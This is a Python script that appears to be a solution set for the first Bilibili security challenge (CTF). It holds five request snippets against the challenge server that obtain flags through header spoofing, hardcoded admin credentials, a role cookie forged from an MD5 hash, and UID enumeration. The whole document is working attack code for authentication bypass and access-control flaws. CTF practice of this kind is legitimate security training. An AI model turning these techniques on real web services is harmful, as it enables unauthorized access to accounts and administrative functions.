# B站首届安全挑战赛

# %%
import hashlib
from pprint import pprint

import requests

# 从浏览器获取自己的B站session
bilibili_session = ""
cookies = {"session": bilibili_session}


# %%
# flag1
response = requests.get("http://45.113.201.36/api/admin", cookies=cookies)
pprint(response.json())

# %%
# flag2
response = requests.get(
    "http://45.113.201.36/api/ctf/2",
    cookies=cookies,
    headers={"User-Agent": "bilibili Security Browser"},
)
pprint(response.json())


# %%
# flag3
response = requests.post(
    "http://45.113.201.36/api/ctf/3",
    cookies=cookies,
    headers={"Content-Type": "application/json"},
    json={"username": "admin", "passwd": "bilibili"},
)
pprint(response.json())


# %%

# flag4
cookies_with_role = cookies
cookies_with_role["role"] = hashlib.md5(b"Administrator").hexdigest()
response = requests.get("http://45.113.201.36/api/ctf/4", cookies=cookies_with_role)
pprint(response.json())

# %%
# flag5
start_uid = 100336889
for i in range(start_uid, start_uid + 100):
    response = requests.get(
        "http://45.113.201.36/api/ctf/5", cookies=cookies, params={"uid": i}
    )
    if response.json()["code"] == 200:
        pprint(response.json())
        break
